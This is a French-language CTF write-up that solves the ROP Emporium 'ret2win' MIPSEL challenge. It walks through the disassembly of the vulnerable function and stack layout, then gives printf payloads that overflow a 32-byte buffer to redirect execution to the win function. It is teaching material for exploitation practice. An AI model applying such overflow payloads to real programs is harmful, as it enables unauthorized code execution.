
---
Title: Ropemporium mipsel ret2win
Date: 2023-07-01
Tags: [linux, python, ROP, mipsel, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---


# ret2win MIPSEL

## Introduction.

Cette article démarre une série consacrée à la résolution des challenges [ropemporium](https://ropemporium.com/challenge/ret2win.html).
Avec la version MIPSEL.

Voir les recommendation du [Guide du débutant](https://ropemporium.com/guide.html) pour l'installation des prérequis qemu et de la version multi-architecture de gdb.

En particulier pour l'installation du laboratoire de travail.

    $ sudo apt install qemu-user
    $ sudo apt install libc6-mipsel-cross
    $ sudo mkdir /etc/qemu-binfmt
    $ sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel


### Minimum sur l'assembleur MIPS.

Reference :

- https://en.wikipedia.org/wiki/MIPS_architecture#Calling_conventions
- https://jarrettbillingsley.github.io/teaching/classes/cs0447/guides/instructions.html
- https://www.dsi.unive.it/~gasparetto/materials/MIPS_Instruction_Set.pdf


## Découverte

Execution du programme avec qemu

    ret2win$ qemu-mipsel ret2win_mipsel
    ret2win by ROP Emporium
    MIPS

    For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
    What could possibly go wrong?
    You there, may I have your input please? And don't worry about null bytes, we're using read()!

    > AAAAAAAA
    Thank you!

    Exiting

Execution sous gdb

    ret2win$ gdb-multiarch ret2win_mipsel
    GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
    Copyright (C) 2021 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <https://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
        <http://www.gnu.org/software/gdb/documentation/>.

    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    GEF for linux ready, type `gef' to start, `gef config' to configure
    90 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.00ms using Python engine 3.9
    Reading symbols from ret2win_mipsel...
    (No debugging symbols found in ret2win_mipsel)
    gef➤




## Analyse

### Desassemblage de la fonction vulnérable

Sous GDB/GEF le desassemblage est peu lisible.
Les appels de fonctions en particulier de sont pas clairement résolues.


    gef➤  disass pwnme
    Dump of assembler code for function pwnme:
    0x004008f4 <+0>:	addiu	sp,sp,-64
    0x004008f8 <+4>:	sw	ra,60(sp)
    0x004008fc <+8>:	sw	s8,56(sp)
    0x00400900 <+12>:	move	s8,sp
    0x00400904 <+16>:	lui	gp,0x42
    0x00400908 <+20>:	addiu	gp,gp,-28656
    0x0040090c <+24>:	sw	gp,16(sp)
    0x00400910 <+28>:	li	a2,32
    0x00400914 <+32>:	move	a1,zero
    0x00400918 <+36>:	addiu	v0,s8,24
    0x0040091c <+40>:	move	a0,v0
    0x00400920 <+44>:	lw	v0,-32700(gp)
    0x00400924 <+48>:	move	t9,v0
    0x00400928 <+52>:	jalr	t9
    0x0040092c <+56>:	nop
    0x00400930 <+60>:	lw	gp,16(s8)
    0x00400934 <+64>:	lui	v0,0x40
    0x00400938 <+68>:	addiu	a0,v0,3212
    0x0040093c <+72>:	lw	v0,-32680(gp)
    0x00400940 <+76>:	move	t9,v0
    0x00400944 <+80>:	jalr	t9
    0x00400948 <+84>:	nop
    0x0040094c <+88>:	lw	gp,16(s8)
    0x00400950 <+92>:	lui	v0,0x40
    0x00400954 <+96>:	addiu	a0,v0,3308
    0x00400958 <+100>:	lw	v0,-32680(gp)
    0x0040095c <+104>:	move	t9,v0
    0x00400960 <+108>:	jalr	t9
    0x00400964 <+112>:	nop
    0x00400968 <+116>:	lw	gp,16(s8)
    0x0040096c <+120>:	lui	v0,0x40
    0x00400970 <+124>:	addiu	a0,v0,3340
    0x00400974 <+128>:	lw	v0,-32680(gp)
    0x00400978 <+132>:	move	t9,v0
    0x0040097c <+136>:	jalr	t9
    0x00400980 <+140>:	nop
    0x00400984 <+144>:	lw	gp,16(s8)
    0x00400988 <+148>:	lui	v0,0x40
    0x0040098c <+152>:	addiu	a0,v0,3436
    0x00400990 <+156>:	lw	v0,-32676(gp)
    0x00400994 <+160>:	move	t9,v0
    0x00400998 <+164>:	jalr	t9
    0x0040099c <+168>:	nop
    0x004009a0 <+172>:	lw	gp,16(s8)
    0x004009a4 <+176>:	li	a2,56
    0x004009a8 <+180>:	addiu	v0,s8,24
    0x004009ac <+184>:	move	a1,v0
    0x004009b0 <+188>:	move	a0,zero
    0x004009b4 <+192>:	lw	v0,-32668(gp)
    0x004009b8 <+196>:	move	t9,v0
    0x004009bc <+200>:	jalr	t9
    0x004009c0 <+204>:	nop
    0x004009c4 <+208>:	lw	gp,16(s8)
    0x004009c8 <+212>:	lui	v0,0x40
    0x004009cc <+216>:	addiu	a0,v0,3440
    0x004009d0 <+220>:	lw	v0,-32680(gp)
    0x004009d4 <+224>:	move	t9,v0
    0x004009d8 <+228>:	jalr	t9
    0x004009dc <+232>:	nop
    0x004009e0 <+236>:	lw	gp,16(s8)
    0x004009e4 <+240>:	nop
    0x004009e8 <+244>:	move	sp,s8
    0x004009ec <+248>:	lw	ra,60(sp)
    0x004009f0 <+252>:	lw	s8,56(sp)
    0x004009f4 <+256>:	addiu	sp,sp,64
    0x004009f8 <+260>:	jr	ra
    0x004009fc <+264>:	nop
    End of assembler dump.


radare2 est plus efficace.

    0x00400830]> pdf @sym.pwnme
                ; CALL XREF from main @ 0x4008b0
    ┌ 268: sym.pwnme (int32_t arg1, char **arg3, int32_t arg_10h, int32_t arg_18h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; arg int32_t arg_18h @ fp+0x18
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_38h @ sp+0x38
    │           ; var int32_t var_3ch @ sp+0x3c
    │           ; arg int32_t arg1 @ a0
    │           ; arg char **arg3 @ a2
    │           0x004008f4      c0ffbd27       addiu sp, sp, -0x40         ; Dimensionnment de la pile
    │           0x004008f8      3c00bfaf       sw ra, (var_3ch)            ; Sauvegarde de ra en "fin de pile" (sp+60)
    │           0x004008fc      3800beaf       sw fp, (var_38h)            ; Sauvegarde de fp juste avant (sp+56)
    │           0x00400900      25f0a003       move fp, sp                 ; fp <= sp
    │           0x00400904      42001c3c       lui gp, 0x42                ; 68
    │           0x00400908      10909c27       addiu gp, gp, -0x6ff0
    │           0x0040090c      1000bcaf       sw gp, (var_10h)
    │           0x00400910      20000624       addiu a2, zero, 0x20        ; a2=32
    │           0x00400914      25280000       move a1, zero
    │           0x00400918      1800c227       addiu v0, fp, 0x18
    │           0x0040091c      25204000       move a0, v0
    │           0x00400920      4480828f       lw v0, -sym.imp.memset(gp)  ; [0x411054:4]=0x400be0 sym.imp.memset
    │           0x00400924      25c84000       move t9, v0
    │           0x00400928      09f82003       jalr t9
    │           0x0040092c      00000000       nop
    │           0x00400930      1000dc8f       lw gp, (var_10h)
    │           0x00400934      4000023c       lui v0, 0x40                ; '@'
    │           0x00400938      8c0c4424       addiu a0, v0, 0xc8c         ; 0x400c8c ; "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!" ;
    │           0x0040093c      5880828f       lw v0, -sym.imp.puts(gp)    ; [0x411068:4]=0x400ba0 sym.imp.puts
    │           0x00400940      25c84000       move t9, v0
    │           0x00400944      09f82003       jalr t9
    │           0x00400948      00000000       nop
    │           0x0040094c      1000dc8f       lw gp, (var_10h)
    │           0x00400950      4000023c       lui v0, 0x40                ; '@'
    │           0x00400954      ec0c4424       addiu a0, v0, 0xcec         ; 0x400cec ; "What could possibly go wrong?" ; arg1 ; str.What_could_possibly_go_wrong_
    │           0x00400958      5880828f       lw v0, -sym.imp.puts(gp)    ; [0x411068:4]=0x400ba0 sym.imp.puts
    │           0x0040095c      25c84000       move t9, v0
    │           0x00400960      09f82003       jalr t9
    │           0x00400964      00000000       nop
    │           0x00400968      1000dc8f       lw gp, (var_10h)
    │           0x0040096c      4000023c       lui v0, 0x40                ; '@'
    │           0x00400970      0c0d4424       addiu a0, v0, 0xd0c         ; 0x400d0c ; "You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
    │           0x00400974      5880828f       lw v0, -sym.imp.puts(gp)    ; [0x411068:4]=0x400ba0 sym.imp.puts
    │           0x00400978      25c84000       move t9, v0
    │           0x0040097c      09f82003       jalr t9
    │           0x00400980      00000000       nop
    │           0x00400984      1000dc8f       lw gp, (var_10h)
    │           0x00400988      4000023c       lui v0, 0x40                ; '@'
    │           0x0040098c      6c0d4424       addiu a0, v0, 0xd6c         ; arg1 ; esilref: '> '
    │           0x00400990      5c80828f       lw v0, -sym.imp.printf(gp)  ; [0x41106c:4]=0x400b90 sym.imp.printf
    │           0x00400994      25c84000       move t9, v0
    │           0x00400998      09f82003       jalr t9
    │           0x0040099c      00000000       nop
    │           0x004009a0      1000dc8f       lw gp, (var_10h)
    │           0x004009a4      38000624       addiu a2, zero, 0x38        ; arg3
    │           0x004009a8      1800c227       addiu v0, fp, 0x18
    │           0x004009ac      25284000       move a1, v0
    │           0x004009b0      25200000       move a0, zero
    │           0x004009b4      6480828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x411074:4]=0x400b80 sym.imp.read
    │           0x004009b8      25c84000       move t9, v0
    │           0x004009bc      09f82003       jalr t9
    │           0x004009c0      00000000       nop
    │           0x004009c4      1000dc8f       lw gp, (var_10h)
    │           0x004009c8      4000023c       lui v0, 0x40                ; '@'
    │           0x004009cc      700d4424       addiu a0, v0, 0xd70         ; 0x400d70 ; "Thank you!" ; arg1 ; str.Thank_you_
    │           0x004009d0      5880828f       lw v0, -sym.imp.puts(gp)    ; [0x411068:4]=0x400ba0 sym.imp.puts
    │           0x004009d4      25c84000       move t9, v0
    │           0x004009d8      09f82003       jalr t9
    │           0x004009dc      00000000       nop
    │           0x004009e0      1000dc8f       lw gp, (var_10h)
    │           0x004009e4      00000000       nop
    │           0x004009e8      25e8c003       move sp, fp
    │           0x004009ec      3c00bf8f       lw ra, (var_3ch)
    │           0x004009f0      3800be8f       lw fp, (var_38h)
    │           0x004009f4      4000bd27       addiu sp, sp, 0x40
    │           0x004009f8      0800e003       jr ra
    └           0x004009fc      00000000       nop


Regardons d'abord comment fonctionne le préambule de la fonction.
    0x004008f4      c0ffbd27       addiu sp, sp, -0x40         ; Dimensionnment de la pile
    0x004008f8      3c00bfaf       sw ra, (var_3ch)            ; Sauvegarde de ra en "fin de pile" (sp+60)
    0x004008fc      3800beaf       sw fp, (var_38h)            ; Sauvegarde de fp juste avant (sp+56)
    0x00400900      25f0a003       move fp, sp                 ; fp <= sp
    0x00400904      42001c3c       lui gp, 0x42                ; 68
    0x00400908      10909c27       addiu gp, gp, -0x6ff0
    0x0040090c      1000bcaf       sw gp, (var_10h)

A l'entree dans la fonction on :
    stack pointer sp: 0x40800390
    frame pointer fp: 0x40800390
    return address ra: 0x4008b8

    gef➤  x/16x $sp
    0x40800350:	0x00000005	0x00000005	0x3ffaac78	0x3fe81844
    0x40800360:	0x00419010	0x3ffe20f4	0x00419010	0x3ffc723c
                save gp
    0x40800370:	0x3ffb2dc0	0x00400ab4	0x00000000	0x00400a70
    0x40800380:	0x00000000	0x00000000	0x40800390	0x004008b8
                                        save fp     save ra

One a ensuite un appel memset(buffer, 0, 32)
Le buffer etant une variable locale, var_18 pour r2. située en sp+0x18

│           0x00400914      25280000       move a1, zero
│           0x00400918      1800c227       addiu v0, fp, 0x18
│           0x0040091c      25204000       move a0, v0
│           0x00400920      4480828f       lw v0, -sym.imp.memset(gp)  ; [0x411054:4]=0x400be0 sym.imp.memset
│           0x00400924      25c84000       move t9, v0
│           0x00400928      09f82003       jalr t9

au moment de l'appel (jarl t9) :

Les registes :

   ref➤  i r
             zero       at       v0       v1       a0       a1       a2       a3
    R0   00000000 00000001 00400be0 ffffffff 40800368 00000000 00000020 00000000
               t0       t1       t2       t3       t4       t5       t6       t7
    R8   00000004 000007eb 3ffc7860 3ffff300 3fe25070 00000000 3fe1b780 0000000f
               s0       s1       s2       s3       s4       s5       s6       s7
    R16  00000000 00400a70 00000000 00000000 00000000 00000000 3ffff300 00000000
               t8       t9       k0       k1       gp       sp       s8       ra
    R24  00000000 00400be0 00000000 00000000 00419010 40800350 40800350 004008b8
               sr       lo       hi      bad    cause       pc
         24000010 001f8dab 000000c0 00000000 00000000 00400928
              fsr      fir
         00000000 00739300

Les parametres sont dans a0,a1,a2.

Apres execution voyons la pile

    gef➤  x/16x $sp
    0x40800350:	0x00000005	0x00000005	0x3ffaac78	0x3fe81844
    0x40800360:	0x00419010	0x3ffe20f4	0x00000000	0x00000000
                save gp                 buffer
    0x40800370:	0x00000000	0x00000000	0x00000000	0x00000000
    0x40800380:	0x00000000	0x00000000	0x40800390	0x004008b8
                                        save fp     save ra

Le buffer a été mis à zero


Appel de la fonction de lecture.

    0x004009a0      1000dc8f       lw gp, (var_10h)
    0x004009a4      38000624       addiu a2, zero, 0x38      ; a2 = 50
    0x004009a8      1800c227       addiu v0, fp, 0x18
    0x004009ac      25284000       move a1, v0               ; a1 = fp+24
    0x004009b0      25200000       move a0, zero             ; a0 = 0
    0x004009b4      6480828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x411074:4]=0x400b80 sym.imp.read
    0x004009b8      25c84000       move t9, v0
    0x004009bc      09f82003       jalr t9                  ; jump and link register t9 => call t9
    0x004009c0      00000000       nop




## Exploitation


Recherche de l'adresse de ret2win :

    ret2win$ readelf -s ret2win_mipsel|grep ret2win
    44: 00000000     0 FILE    LOCAL  DEFAULT  ABS ret2win.c
    46: 00400a00   112 FUNC    LOCAL  DEFAULT   13 ret2win


Envoi d'un message constitué de 36 * "A" | 0x400a00

    printf "%36s\x00\x0a\x40\x00" A |qemu-mipsel -g 1337 ret2win_mipsel

Resultat :

    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}


Ca marche mais on boucle. Pourquoi ?

Observons le retour sous gdb

    GEF> b *pwnme+260

AU moment du retour de pwnme :

     0x4009ec <pwnme+248>      lw     ra, 60(sp)
     0x4009f0 <pwnme+252>      lw     s8, 56(sp)
     0x4009f4 <pwnme+256>      addiu  sp, sp, 64
     0x4009f8 <pwnme+260>      jr     ra
    ↳   0x400a00 <ret2win+0>      addiu  sp, sp, -32
        0x400a04 <ret2win+4>      sw     ra, 28(sp)
        0x400a08 <ret2win+8>      sw     s8, 24(sp)

Notre regitre ra est positionné à l'adresse de ret2win

    gef➤  i r ra
    ra: 0x400a00

Mais l'entrée dans la fonction ne se faisant pas par l'instruction jal.
ra n'est pas mis à jour et au ret de ret2win on reboucle.

    gef➤  disas ret2win
    Dump of assembler code for function ret2win:
    0x00400a00 <+0>:	addiu	sp,sp,-32
    0x00400a04 <+4>:	sw	ra,28(sp)
    0x00400a08 <+8>:	sw	s8,24(sp)
    0x00400a0c <+12>:	move	s8,sp
    0x00400a10 <+16>:	lui	gp,0x42
    0x00400a14 <+20>:	addiu	gp,gp,-28656
    0x00400a18 <+24>:	sw	gp,16(sp)
    0x00400a1c <+28>:	lui	v0,0x40
    0x00400a20 <+32>:	addiu	a0,v0,3452
    0x00400a24 <+36>:	lw	v0,-32680(gp)
    0x00400a28 <+40>:	move	t9,v0
    0x00400a2c <+44>:	jalr	t9
    0x00400a30 <+48>:	nop
    0x00400a34 <+52>:	lw	gp,16(s8)
    0x00400a38 <+56>:	lui	v0,0x40
    0x00400a3c <+60>:	addiu	a0,v0,3484
    0x00400a40 <+64>:	lw	v0,-32684(gp)
    0x00400a44 <+68>:	move	t9,v0
    0x00400a48 <+72>:	jalr	t9
    0x00400a4c <+76>:	nop
    0x00400a50 <+80>:	lw	gp,16(s8)
    0x00400a54 <+84>:	nop
    0x00400a58 <+88>:	move	sp,s8
    0x00400a5c <+92>:	lw	ra,28(sp)
    0x00400a60 <+96>:	lw	s8,24(sp)
    0x00400a64 <+100>:	addiu	sp,sp,32
    0x00400a68 <+104>:	jr	ra
    0x00400a6c <+108>:	nop
    End of assembler dump.

Si on saute plutôt sur l'adresse `0x00400a08`

    0x00400a00 <+0>:	addiu	sp,sp,-32
    0x00400a04 <+4>:	sw	ra,28(sp)
 => 0x00400a08 <+8>:	sw	s8,24(sp)

On saute la sauvegarde de `ra` en `sp+28`.

Et a la fin :

    0x00400a5c <+92>:	lw	ra,28(sp)

on va restorer da ra la valeur présente en sp+28. El fera peut planter le programme mais pas boucler.

### Execution

    mipsel/ret2win$ printf "%36s\x08\x0a\x40\x00" A |qemu-mipsel   ret2win_mipsel
    ret2win by ROP Emporium
    MIPS

    For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
    What could possibly go wrong?
    You there, may I have your input please? And don't worry about null bytes, we're using read()!

    > Thank you!
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}

